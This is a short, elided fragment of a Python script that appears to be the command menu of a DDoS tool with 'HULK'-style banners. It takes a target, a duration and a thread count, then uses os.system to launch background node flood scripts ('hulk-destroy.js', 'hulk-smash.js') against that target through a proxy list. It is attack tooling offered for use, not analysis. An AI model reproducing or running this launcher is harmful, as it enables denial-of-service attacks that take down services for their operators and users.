...
""")
            ...
            try:
                ...
                time = sin.split()[2]
                Threads = sin.split()[3]
                os.system(f'cd l7 && screen -dm node hulk-destroy.js GET {target} proxy.txt {time} 512 {Threads} 443 ')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
...
""")
            ...
            try:
                target = sin.split()[1]
                time = sin.split()[2]
                os.system(f'cd l12 && screen -dm node hulk-smash.js {target} {time} 8 1 proxy.txt ')
                os.system ("clear")
                print (f"""
                 \033[36m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[34m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
